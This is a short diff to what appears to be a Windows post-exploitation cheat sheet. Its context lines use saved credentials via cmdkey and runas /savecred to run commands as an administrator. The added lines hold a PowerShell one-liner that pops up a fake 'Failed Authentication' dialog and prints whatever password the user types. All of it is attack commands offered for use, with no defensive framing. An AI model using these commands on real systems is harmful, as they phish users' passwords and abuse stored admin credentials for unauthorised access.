@@ -28,4 +28,6 @@ cmdkey /list -> check for admin if it has cred save then run-->
 # run a command as runas:
 runas /savecred /user:admin "C:\Windows\System32\cmd.exe /c dir /b /a /s C:\ > c:\where\you\can\write\to"
 
+###Create a pop up asking for the user password, if we have a session
+powershell "$cred = $host.ui.promptforcredential('Failed Authentication','', [Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
 
